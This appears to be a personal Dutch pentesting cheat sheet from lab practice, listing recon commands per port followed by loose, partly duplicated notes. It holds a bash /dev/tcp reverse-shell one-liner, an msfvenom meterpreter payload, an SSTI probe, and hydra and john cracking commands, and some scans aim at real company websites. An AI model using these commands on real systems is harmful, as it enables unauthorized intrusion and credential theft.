
# Overzicht Commando's en Bijbehorende Poorten

## Poort 21 - FTP (File Transfer Protocol)

### Commando's:

bash

```bash
# FTP verbinding maken
ftp 10.129.52.6
ftp 10.129.51.235
ftp -p 10.129.52.6  # Passieve modus

# FTP via cURL
curl -s --user anonymous:anonymous ftp://10.129.52.6/
curl -s --user anonymous:anonymous ftp://10.129.52.6/flag.txt

# Netcat FTP banner grabbing
nc -nv 10.129.55.198 21
```

### Doel:

- Bestandsoverdracht tussen systemen
- Anonymous login testen
- Bestanden downloaden/uploaden
- Banner grabbing voor versie-identificatie

---

## Poort 22 - SSH (Secure Shell)

### Commando's:

bash

```bash
# SSH verbinding
ssh root@83.136.253.144 -p 33575 -i rsa
ssh user1@83.136.253.144 -p 33575
ssh bob@10.129.227.226
ssh bob@10.129.227.226 -p 33612

# SSH banner grabbing
nc 10.129.2.47 22
# Output: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7

# Nmap SSH scripts
nmap -p 22 --script ssh2-enum-algos,ssh-hostkey 192.168.111.83
```

### Doel:

- Remote shell access
- Veilige bestandsoverdracht (SFTP)
- Versie-identificatie
- Sleutelgebaseerde authenticatie

---

## Poort 23 - Telnet

### Commando's:

bash

```bash
# Telnet verbinding
telnet 10.129.2.47 50000

# Nmap scan
nmap -Pn --open -p 23,2323,2023,7331,8000,8080,445 10.129.55.198
```

### Doel:

- Onveilige remote toegang
- Service banner grabbing
- Legacy systeem toegang

---

## Poort 25 - SMTP (Simple Mail Transfer Protocol)

### Commando's:

bash

```bash
# Netcat SMTP verbinding
nc -nv 10.129.4.76 25

# Nmap SMTP scan
sudo nmap -sV -p25 10.129.4.76

# SMTP user enumeratie
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.129.4.76
```

### Doel:

- E-mail verzending
- User enumeratie via VRFY/EXPN
- Mail relay testen
- Banner grabbing

---

## Poort 53 - DNS (Domain Name System)

### Commando's:

bash

```bash
# Zone transfers
dig axfr @nsztm1.digi.ninja zonetransfer.me
dig axfr inlanefreight.htb @10.129.3.168
dig axfr internal.inlanefreight.htb @10.129.3.168
dig axfr dev.inlanefreight.htb @10.129.3.168

# DNS queries
dig ns inlanefreight.htb @10.129.14.128
dig any inlanefreight.htb @10.129.3.168
dig @10.129.2.47 version.bind chaos txt
dig @10.129.2.48 version.bind chaos txt

# Host lookup
host -l inlanefreight.htb 10.129.5.255
host dev.inlanefreight.htb 10.129.3.168
host customer.inlanefreight.htb 10.129.3.168

# DNS enumeratie
dnsenum --dnsserver 10.129.3.168 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb

# Gobuster DNS
gobuster dns -d dev.inlanefreight.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt -r 10.129.3.168

# Nmap DNS scan
sudo nmap -sU -p53,161,123,137 10.129.2.47
```

### Doel:

- Zone transfer attacks (AXFR)
- Subdomain enumeratie
- DNS server versie-identificatie
- Reverse DNS lookups
- DNS cache poisoning detectie

---

## Poort 80 - HTTP (Hypertext Transfer Protocol)

### Commando's:

bash

```bash
# cURL requests
curl http://10.129.66.16
curl http://10.129.2.47
curl -I https://app.coolblue.nl/
curl -I http://94.237.58.137:54402
curl -s http://94.237.58.137:54402/robots.txt

# Directory fuzzing
gobuster dir -u http://192.168.111.83:8088 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
gobuster dir -u http://10.129.131.205 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
dirb http://10.129.131.205

# FFUF fuzzing
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://spssite.caci.com/FUZZ -e .php,.html,.txt -fc 404,503

# Whatweb fingerprinting
whatweb -a 3 http://10.129.58.151
whatweb 10.129.58.151

# Nuclei scanning
nuclei -u http://10.129.131.205
nuclei -u https://www.mufgamericas.com -t technologies/drupal/

# Gospider crawling
gospider -s https://0a3c007f03cb1179812407c500b2000e.web-security-academy.net/ -d 3 -c 10 -t 10
```

### Doel:

- Web applicatie reconnaissance
- Directory/file discovery
- Vulnerability scanning
- Web crawling
- Technology fingerprinting

---

## Poort 110 - POP3 (Post Office Protocol)

### Commando's:

bash

```bash
# Netcat POP3 verbinding
nc -nv 10.129.4.76 110

# Nmap POP3 scan
sudo nmap -sC -sV -A -p 21,22,111,139,445,2049 10.129.51.235
```

### Doel:

- E-mail ophalen
- User credentials testen
- Banner grabbing

---

## Poort 111 - RPCbind

### Commando's:

bash

```bash
# Nmap RPC scan
sudo nmap -sC -sV -Pn -A -p 21,22,111,139,445,2049 10.129.3.151

# NFS shares tonen
showmount -e 10.129.3.151
```

### Doel:

- RPC service mapping
- NFS share discovery
- RPC service enumeratie

---

## Poort 135 - MSRPC (Microsoft RPC)

### Commando's:

bash

```bash
# Nmap Windows scan
sudo nmap -sV -sC -A -p 135,139,445,1433,3389,5985 10.129.4.132
```

### Doel:

- Windows RPC services
- DCOM communicatie
- Remote procedure calls

---

## Poort 139 + 445 - SMB/NetBIOS

### Commando's:

bash

```bash
# SMB verbindingen
smbclient -L //10.129.55.198 -N
smbclient //10.129.51.27/sambashare -N
smbclient -U bob%Welcome1 //10.129.55.198/users
smbclient -U bob '//10.129.55.198/users' --option='client min protocol=NT1'

# SMB met credentials
smbclient //10.129.8.165/users -U bob.smith@inlanefreight.local
smbclient -L //10.129.4.190/ -U htb

# Smbmap
smbmap -H 10.129.130.86 -u alex -p 'lol123!mD'

# Enum4linux
enum4linux 10.129.2.47
enum4linux -a 10.129.4.190

# Nmap SMB scripts
sudo nmap -sV -p 445 --script smb-os-discovery 10.129.52.6
sudo nmap -sV -p 445 --script smb-os-discovery -Pn 10.129.202.5
nc -zv 10.129.2.47 445

# NBTscan
nbtscan 10.129.2.47

# RPCclient
rpcclient -U "" -N 10.129.51.27
```

### Doel:

- Windows file sharing
- User/share enumeratie
- Password attacks
- OS fingerprinting
- Null session attacks

---

## Poort 143 - IMAP (Internet Message Access Protocol)

### Commando's:

bash

```bash
# cURL IMAP
curl -k 'imaps://10.129.4.76' --user robin:robin
curl -k 'imaps://10.129.4.76/INBOX;MAILINDEX=1' --user robin:robin
curl -k 'imaps://10.129.4.76/INBOX;MAILINDEX=2' --user robin:robin
```

### Doel:

- E-mail ophalen (advanced dan POP3)
- Mailbox synchronisatie
- E-mail folder beheer

---

## Poort 161 - SNMP (Simple Network Management Protocol)

### Commando's:

bash

```bash
# SNMPwalk
snmpwalk -v2c -c public 10.129.4.76
snmpwalk -v2c -c public 10.129.4.76 | grep "HTB{"

# Onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.4.76

# Nmap SNMP scan
sudo nmap -sU -p53,161,123,137 10.129.2.47
```

### Doel:

- Network device management
- Community string discovery
- System information gathering
- MIB browsing

---

## Poort 623 - IPMI (Intelligent Platform Management Interface)

### Commando's:

bash

```bash
# Nmap IPMI scan
sudo nmap -sU --script ipmi-version -p 623 10.129.4.160

# Metasploit IPMI
msfconsole -q
# use auxiliary/scanner/ipmi/ipmi_dumphashes

# Hashcat IPMI hash cracking
hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
```

### Doel:

- Remote server management
- IPMI hash dumping
- BMC/iLO/iDRAC toegang
- Hardware monitoring

---

## Poort 993 + 995 - IMAPS/POP3S

### Commando's:

bash

```bash
# Nmap secure mail scan
sudo nmap -sC -sV -A -p 22,25,53,110,143,993,995,3306 10.129.4.76
```

### Doel:

- Encrypted e-mail retrieval
- SSL/TLS mail protocols

---

## Poort 1433 - MSSQL (Microsoft SQL Server)

### Commando's:

bash

```bash
# Impacket MSSQL client
impacket-mssqlclient backdoor:Password1@10.129.4.132
impacket-mssqlclient backdoor:Password1@10.129.4.132 -windows-auth

# Nmap MSSQL scan
sudo nmap -sV -sC -A -p 135,139,445,1433,3389,5985 10.129.4.132
```

### Doel:

- Database queries uitvoeren
- xp_cmdshell command execution
- Database enumeratie
- Credential dumping

---

## Poort 1521 - Oracle Database

### Commando's:

bash

```bash
# SQLplus
sqlplus scott/tiger@10.129.4.142/XE
sqlplus scott/tiger@10.129.4.142/XE as sysdba

# ODAT (Oracle Database Attack Tool)
cd ~/odat
python3 odat.py passwordguesser -s 10.129.4.142 -p 1521 -d XE

# Nmap Oracle scan
sudo nmap -p 1521 --script oracle-sid-brute 10.129.4.142
```

### Doel:

- Oracle database toegang
- SID bruteforcing
- Password guessing
- Privilege escalation

---

## Poort 2049 - NFS (Network File System)

### Commando's:

bash

```bash
# Showmount
showmount -e 10.129.3.151
showmount -e 10.129.4.190

# NFS mount
sudo mkdir -p /mnt/techsupport
sudo mount -t nfs 10.129.4.190:/TechSupport /mnt/techsupport
sudo mount -t nfs 10.129.3.151:/var/nfs ~/nfs_mount -o nolock

# Files bekijken
sudo ls -la /mnt/techsupport
sudo cat /mnt/techsupport/ticket4238791283782.txt
sudo strings /mnt/techsupport/* | grep -i htb

# Nmap NFS scan
nmap -p111,2049 -sV -sC <target>
```

### Doel:

- Network file sharing
- Remote file access
- Data exfiltration
- Configuration file reading

---

## Poort 3306 - MySQL/MariaDB

### Commando's:

bash

```bash
# MySQL verbinding
mysql -h 10.129.4.76 -u robin -probin -e "SELECT VERSION();"
mysql -u robin -h 10.129.4.76 -probin
mysql -h 10.129.4.76 -u robin -probin --skip-ssl -e "SHOW DATABASES;"
mysql -h 10.129.4.76 -u robin -probin --skip-ssl -e "USE customers; SHOW TABLES;"

# Nmap MySQL scan
sudo nmap -sV -p3306,5432,1433,27017,6379 10.129.2.47
nc -zv 10.129.2.47 3306
```

### Doel:

- Database toegang
- Data extractie
- User enumeratie
- Privilege escalation

---

## Poort 3389 - RDP (Remote Desktop Protocol)

### Commando's:

bash

```bash
# Nmap RDP scan
sudo nmap -sV -sC -A -p 135,139,445,1433,3389,5985 10.129.4.132
```

### Doel:

- Remote desktop toegang
- Windows GUI toegang
- Credential attacks

---

## Poort 5985 - WinRM (Windows Remote Management)

### Commando's:

bash

```bash
# Nmap WinRM scan
sudo nmap -sV -sC -A -p 135,139,445,1433,3389,5985 10.129.4.132
```

### Doel:

- Remote PowerShell
- Windows management
- Command execution

---

## Poort 8000, 8080, 8088 - Alternative HTTP

### Commando's:

bash

```bash
# Gobuster
gobuster dir -u http://192.168.111.83:8088 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# cURL
curl http://192.168.121.76:8000
curl http://192.168.121.76:8000/admin.php

# Nmap
nmap -Pn --open -p 23,2323,2023,7331,8000,8080,445 10.129.55.198
nmap -sV -p 8080 10.129.55.198
```

### Doel:

- Alternative web servers
- Development servers
- Proxy services
- Admin panels

---

## Poort 10001 - Custom HTTP Service

### Commando's:

bash

```bash
# cURL HTTP/0.9
curl --http0.9 http://10.129.131.205:10001/
curl http://10.129.131.205:10001/status

# Netcat
nc 10.129.2.47 10001
```

### Doel:

- Custom application protocol
- Legacy HTTP services

---

## Poort 31337 - Custom/Backdoor Port

### Commando's:

bash

```bash
# Nmap scan
sudo nmap -p 22,80,110,139,143,445,31337 --script=safe -Pn 10.129.55.183
sudo nmap 10.129.55.183 -p 22,80,110,139,143,445,31337 -sV --script vuln -Pn
```

### Doel:

- Common backdoor port
- Custom services
- Malware C2 channels

---

## Poort 50000 - Custom Service

### Commando's:

bash

```bash
# Netcat
nc -nv 10.129.2.47 50000
sudo nc -nv -p 53 10.129.2.47 50000

# Telnet
telnet 10.129.2.47 50000

# Nmap met source port spoofing
sudo nmap -sV -p50000 --source-port 53 10.129.2.47
```

### Doel:

- Firewall bypass (met source port 53)
- Custom application protocol

---

## Multi-Port Reconnaissance

### Nmap Comprehensive Scans:

bash

```bash
# Full TCP scan
sudo nmap -sV -sC -p- 10.129.55.198
sudo nmap -p- --min-rate 5000 10.129.55.183
sudo nmap -sS -p- -T2 10.129.2.47

# Top ports
sudo nmap -sS --top-ports 20 -T0 --scan-delay 10s --source-port 53 10.129.2.47
sudo nmap -sS --top-ports 100 -T2 10.129.2.47

# Service detection
sudo nmap -sV -sC -A -p- 10.129.3.151
sudo nmap -sC -sV -Pn -A -p 21,22,111,139,445,2049 10.129.3.151

# UDP scan
sudo nmap -sU -p53,161,123,137 10.129.2.47

# Vulnerability scanning
sudo nmap 10.129.55.183 -p 22,80,110,139,143,445,31337 -sV --script vuln -Pn
```

---

## Virtual Host Discovery (Geen specifieke poort)

### FFUF VHost Fuzzing:

bash

```bash
# Subdomain discovery
ffuf -w /usr/share/wordlists/dirb/subdomains.txt -u http://94.237.59.242:54455/ -H "Host: FUZZ.inlanefreight.htb" -fs 120

# Gobuster vhost
gobuster vhost -u http://inlanefreight.htb:54455 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -t 200
gobuster vhost -u http://inlanefreight.htb:59336 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
```

---

## Reverse Shell Listeners

### Netcat Listeners:

bash

```bash
# Verschillende poorten
nc -lvnp 1965
nc -lvnp 9443
nc -lvnp 8443
nc -nlvp 1965
```

### Doel:

- Reverse shell catching
- Exploit payloads ontvangen
- Out-of-band data exfiltration

---

## Port Knocking / Firewall Bypass

### Source Port Manipulation:

bash

```bash
# Gebruik poort 53 als source (vaak allowed door firewalls)
sudo nmap -sS --top-ports 20 -T0 --scan-delay 10s --source-port 53 10.129.2.47
sudo nmap -sS -p21,25,53,110,111,135,139,143,443,445 --source-port 53 10.129.2.47
sudo ncat --source-port 53 10.129.2.47 50000
```

---

## Samenvatting per Service Category

### File Transfer:

- **21** (FTP), **22** (SSH/SFTP), **2049** (NFS), **139/445** (SMB)

### Web Services:

- **80** (HTTP), **443** (HTTPS), **8000/8080/8088** (Alternative HTTP)

### E-mail:

- **25** (SMTP), **110** (POP3), **143** (IMAP), **993** (IMAPS), **995** (POP3S)

### Databases:

- **1433** (MSSQL), **1521** (Oracle), **3306** (MySQL), **5432** (PostgreSQL)

### Remote Access:

- **22** (SSH), **23** (Telnet), **3389** (RDP), **5985** (WinRM)

### Management:

- **161** (SNMP), **623** (IPMI), **135** (MSRPC)

### Infrastructure:

- **53** (DNS), **111** (RPCbind), **139/445** (NetBIOS/SMB)

---

## Security Notes

### Common Attack Vectors per Poort:

1. **FTP (21)**: Anonymous login, weak credentials, directory traversal
2. **SSH (22)**: Brute force, key stealing, version exploits
3. **DNS (53)**: Zone transfers, cache poisoning, subdomain enumeration
4. **HTTP (80/443)**: Directory traversal, SQLi, XSS, RCE
5. **SMB (139/445)**: Null sessions, EternalBlue, credential dumping
6. **SNMP (161)**: Community string guessing, information disclosure
7. **IPMI (623)**: Hash dumping, default credentials
8. **MSSQL (1433)**: xp_cmdshell, weak SA password
9. **Oracle (1521)**: TNS poisoning, privilege escalation
10. **NFS (2049)**: No_root_squash exploitation, data theft


SCRIPT

script -a htbagile  als klaar is exit slaat alles op     479eef9abcb9d427013ef9e15c5308ff


FTP

bestand van terminal naar ftp zetten  (in terminal) sudo touch best.txt   of echo leon > voetbal.txt  # mv leonkeijzers.txt leonkeijzers.html dit zet leon ook in de web text   (in ftp)  put voetbal.txt
anonymous inloggen  ftp 10.10.10.10 anonymous password luhjgkjhgkjhg moet iets intypen 
 
DIRSEARCH

sudo dirsearch -u http://10.129.234.29

MSFVENOM

 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx > payload.aspx

GOBUSTER

gobuster dir -u http://10.129.95.234  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php   php kan ook een andere zijn
sudo gobuster dir -u http://10.129.239.231/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -o initial.crawl -t 20 -x php    

NIKTO

nikto -host http://unika.htb 

CURL

curl localhost

SSTI COBALT

${{<%[%'"}}%\.'"     laatste haakjes ' en " zelf toegevoegd  -injectie voor inlog

LNVP listener

sudo nc -lvnp 80 0f 44444 of 1965 9001 enz
("bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'");     reverse shell   in de gelukte shell typ                 python3 -c 'import pty;pty.spawn("bin/bash")'  sudo -l voor root mogelijkheden


python3

python3 -c 'import pty;pty.spawn("bin/bash")'

VIM editor

TL;DR – How to Exit Vim

    Press ESC once (sometimes twice)
    Make sure you are using the English input method
    The next step depends on the current status and your expectations:
        If you didn't make any changes, type :q and press Enter/return
        If you made some changes and would like to keep them, type :  w   q    and press Enter/return
        If you made some changes and would rather discard them, type :  q   ! and press Enter/return
        
        
    GTFOBins voor alle commando regels !!!!!  
      
TAR   UNZIP   7z x


tar -zxvf pycharm-community-2023.3.2.tar.gz          maar beter rechts klicken en extract here 

PYCHARM
                                                                                                                                                                                                             
kali㉿kali)-[~/Downloads/pycharm-community-2023.3.2/bin]
└─$  ./pycharm.sh
 ./pycharm.sh  bij ./file eerst een spatie dan ./pycharm.sh
 
 UNZIP UNTAR
 
 unzip Access\ Control.zip
7z x Access\ Control.zip
7z l -slt Access\ Control.zip     voor info

WGET

wget -m ftp://anonymous:anonymous@10.129.240.2
wget -m  --no-passiveftp://anonymous:anonymous@10.129.240.26   
wget http://10.129.240.26/out.jpg


EXIFTOOL

exiftool out.jpg

STRINGS 

strings out.jpg    textcode coderen decoderen
strings -n 8 backup.mdb   alles coderen wat niet 8 is


JOHN

zip2john Access\ Control.zip 
      
Access Control.zip/Access Control.pst:
$zip2$*0*3*0*6f1cd9ae3480669b2b61dbb4c0fc7ce3*fef9*299a*7e03b2fdd0eb70b9e76812e1dd7ac7ddcc60da701f91a3683
44796061d688a392b15256fe00fa1db1e383ed05b7ab3051dc56757b7024f7a8d02b4d0e3558e8a29

john -w=/usr/share/wordlists/rockyou.txt hashdecoder



FILE    

file *        
file backup.mdb

SMBCLIENT

smbclient \\\\10.129.239.170\\C$ -U Administrator

HYDRA

hydra -L usernames.txt -p 'funnel123#' ssh//10.129.228.195

NSLOOKUP

nslookup  
set timeout=10   
google.com  
set type=MX
bol.com
set type=ANY
bol.com --fqdn

HOSTNAME

hostnamectl
Server:         192.168.52.2
Address:        192.168.52.2#53

mile2

TCPDUMP

tcpdump is een softwarehulpmiddel (packet sniffer) voor de diagnose en analyse van computernetwerken. Het programma draait op de meeste UNIX(-achtige) systemen, zoals Linux, Solaris, HP-UX, AIX en Mac OS X. Hierbij wordt de netwerkkaart in promiscue modus gezet en wordt gebruikgemaakt van libpcap om pakketjes die in het netwerk worden verzonden af te vangen. Er bestaat ook een Windowsversie onder de naam windump, die op zijn beurt gebruikmaakt van de naar Windows geporteerde versie van libpcap (winpcap).

Het programma werd oorspronkelijk geschreven door Van Jacobson, Craig Leres en Steven McCanne van het Lawrence Berkeley Laboratory van de Universiteit van California. 


NCAT

─$ sudo find / -name nc.exe
[sudo] password for kali: 
/usr/share/windows-resources/binaries/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
find: ‘/run/user/1000/doc’: Permission denied
find: ‘/run/user/1000/gvfs’: Permission denied
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ sudo locate nc.exe      
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe

NCat – Voorbeelden en Gebruik

NCat is een applicatie die aanwezig moet zijn in de tools library van iedere IT Professional en Security Researcher. NCat is een zeer geavanceerde network utility van het Nmap (security scanner) team. NCat is geschreven als verbeterde opvolger van Netcat. Met Netcat kunnen poorten gescand worden, bestanden getransporteerd worden en Netcat kan zelfs als backdoor fungeren

sudo grep root /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh

sudo ifup lo  inet 192.168.52.128 schakeld interface in ifdown schakeld inerface uit
lo =loop back

sudo ifconfig ens160 192.168.52.128 
sudo dhclient ens160 192.168.52.128


sudo route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.52.2    0.0.0.0         UG    100    0        0 eth0
192.168.52.0    0.0.0.0         255.255.255.0   U     100    0        0 eth0

lijst met netwerkroutes

sudo cat /etc/resolv.conf adres domain name server

control c back search (eerste letters typen)




SCRIPT

script -a htbagile  als klaar is exit slaat alles op     479eef9abcb9d427013ef9e15c5308ff


FTP

bestand van terminal naar ftp zetten  (in terminal) sudo touch best.txt   of echo leon > voetbal.txt  # mv leonkeijzers.txt leonkeijzers.html dit zet leon ook in de web text   (in ftp)  put voetbal.txt
anonymous inloggen  ftp 10.10.10.10 anonymous password luhjgkjhgkjhg moet iets intypen 
 
DIRSEARCH

sudo dirsearch -u http://10.129.234.29

MSFVENOM

 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=4444 -f aspx > payload.aspx

GOBUSTER

gobuster dir -u http://10.129.95.234  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php   php kan ook een andere zijn
sudo gobuster dir -u http://10.129.239.231/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -o initial.crawl -t 20 -x php    

NIKTO

nikto -host http://unika.htb 

CURL

curl localhost

SSTI COBALT

${{<%[%'"}}%\.'"     laatste haakjes ' en " zelf toegevoegd  -injectie voor inlog

LNVP listener

sudo nc -lvnp 80 0f 44444 of 1965 9001 enz
("bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'");     reverse shell   in de gelukte shell typ                 python3 -c 'import pty;pty.spawn("bin/bash")'  sudo -l voor root mogelijkheden


python3

python3 -c 'import pty;pty.spawn("bin/bash")'

VIM editor

TL;DR – How to Exit Vim

    Press ESC once (sometimes twice)
    Make sure you are using the English input method
    The next step depends on the current status and your expectations:
        If you didn't make any changes, type :q and press Enter/return
        If you made some changes and would like to keep them, type :  w   q    and press Enter/return
        If you made some changes and would rather discard them, type :  q   ! and press Enter/return
        
        
    GTFOBins voor alle commando regels !!!!!  
      
TAR   UNZIP   7z x


tar -zxvf pycharm-community-2023.3.2.tar.gz          maar beter rechts klicken en extract here 

PYCHARM
                                                                                                                                                                                                             
kali㉿kali)-[~/Downloads/pycharm-community-2023.3.2/bin]
└─$  ./pycharm.sh
 ./pycharm.sh  bij ./file eerst een spatie dan ./pycharm.sh
 
 UNZIP UNTAR
 
 unzip Access\ Control.zip
7z x Access\ Control.zip
7z l -slt Access\ Control.zip     voor info

WGET

wget -m ftp://anonymous:anonymous@10.129.240.2
wget -m  --no-passiveftp://anonymous:anonymous@10.129.240.26   
wget http://10.129.240.26/out.jpg


EXIFTOOL

exiftool out.jpg

STRINGS 

strings out.jpg    textcode coderen decoderen
strings -n 8 backup.mdb   alles coderen wat niet 8 is


JOHN

zip2john Access\ Control.zip 
      
Access Control.zip/Access Control.pst:
$zip2$*0*3*0*6f1cd9ae3480669b2b61dbb4c0fc7ce3*fef9*299a*7e03b2fdd0eb70b9e76812e1dd7ac7ddcc60da701f91a3683
44796061d688a392b15256fe00fa1db1e383ed05b7ab3051dc56757b7024f7a8d02b4d0e3558e8a29

john -w=/usr/share/wordlists/rockyou.txt hashdecoder



FILE    

file *        
file backup.mdb

SMBCLIENT

smbclient \\\\10.129.239.170\\C$ -U Administrator

HYDRA

hydra -L usernames.txt -p 'funnel123#' ssh//10.129.228.195

NSLOOKUP

nslookup  
set timeout=10   
google.com  
set type=MX
bol.com
set type=ANY
bol.com --fqdn

HOSTNAME

hostnamectl
Server:         192.168.52.2
Address:        192.168.52.2#53

mile2

TCPDUMP

tcpdump is een softwarehulpmiddel (packet sniffer) voor de diagnose en analyse van computernetwerken. Het programma draait op de meeste UNIX(-achtige) systemen, zoals Linux, Solaris, HP-UX, AIX en Mac OS X. Hierbij wordt de netwerkkaart in promiscue modus gezet en wordt gebruikgemaakt van libpcap om pakketjes die in het netwerk worden verzonden af te vangen. Er bestaat ook een Windowsversie onder de naam windump, die op zijn beurt gebruikmaakt van de naar Windows geporteerde versie van libpcap (winpcap).

Het programma werd oorspronkelijk geschreven door Van Jacobson, Craig Leres en Steven McCanne van het Lawrence Berkeley Laboratory van de Universiteit van California. 


NCAT

─$ sudo find / -name nc.exe
[sudo] password for kali: 
/usr/share/windows-resources/binaries/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
find: ‘/run/user/1000/doc’: Permission denied
find: ‘/run/user/1000/gvfs’: Permission denied
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ sudo locate nc.exe      
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe

NCat – Voorbeelden en Gebruik

NCat is een applicatie die aanwezig moet zijn in de tools library van iedere IT Professional en Security Researcher. NCat is een zeer geavanceerde network utility van het Nmap (security scanner) team. NCat is geschreven als verbeterde opvolger van Netcat. Met Netcat kunnen poorten gescand worden, bestanden getransporteerd worden en Netcat kan zelfs als backdoor fungeren

sudo grep root /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh

sudo ifup lo  inet 192.168.52.128 schakeld interface in ifdown schakeld inerface uit
lo =loop back

sudo ifconfig ens160 192.168.52.128 
sudo dhclient ens160 192.168.52.128


sudo route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.52.2    0.0.0.0         UG    100    0        0 eth0
192.168.52.0    0.0.0.0         255.255.255.0   U     100    0        0 eth0

lijst met netwerkroutes

sudo cat /etc/resolv.conf adres domain name server

control c back search (eerste letters typen)

sudo nmap -vvv -A scanme.nmap.org -oX nmapop.xml   html scan uitgebrijd

User created with password '435972a4-bec1-47bd-a673-bb53cd975124'.  greenbone  webadres https://127.0.0.1:9392  

SHERLOCK

ENV

FILE *

CONTROL SHIFT T nieuwe tab

sudo find / -name nc.exe

PUT  nc.exe  copy naar ftp 

!ls    kali lijst als ik op een andere pc ben ofzo

ssh@leon192.168.34.34

mount -t sifs 192.169 23.23:setup.exe  

cp of scp setup.exe nc.exe student @192 168 33.212:~   ook copieren

iptables    forwarding 

sudo useradd Leon
tail /etc/passwd 
Leon:x:1001:1001::/home/Leon:/bin/sh

└─$ head /etc/passwd 
su = naar root
$ sudo grep Leon /etc/shadow
Leon:!:19780:0:99999:7:::
sudo passwd Leon                                                         
New password: 
Retype new password: 
passwd: password updated successfully  NACleon1

sudo grep Leon /etc/shadow
Leon:$y$j9T$1DbnUlCK4NBv8C5bNmQRr1$ePVrIwGaypzKb1oie9OQBfCXWKi9AMhtUeB7X./Zbq0:19780:0:99999:7:::
nano /etc/shadow
root:*:19691:0:99999:7:::
daemon:*:19691:0:99999:7:::
bin:*:19691:0:99999:7:::
sys:*:19691:0:99999:7:::
sync:*:19691:0:99999:7

nano/etc/passwd

owner -group owner-everyone  de 3 rechten
chmod 777  alles naar root 

──(root㉿kali)-[/etc]
└─# cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/ma

─# cat /etc/group 
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:kali
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:

─# arp-scan scanme.nmap.org
Interface: eth0, type: EN10MB, MAC: 00:0c:29:97:a9:f7, IPv4: 192.168.52.128
Starting arp-scan 1.10.0 with 1 hosts (https://github.com/royhills/arp-scan)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 1 hosts scanned in 2.053 seconds (0.49 hosts/sec). 0 res














-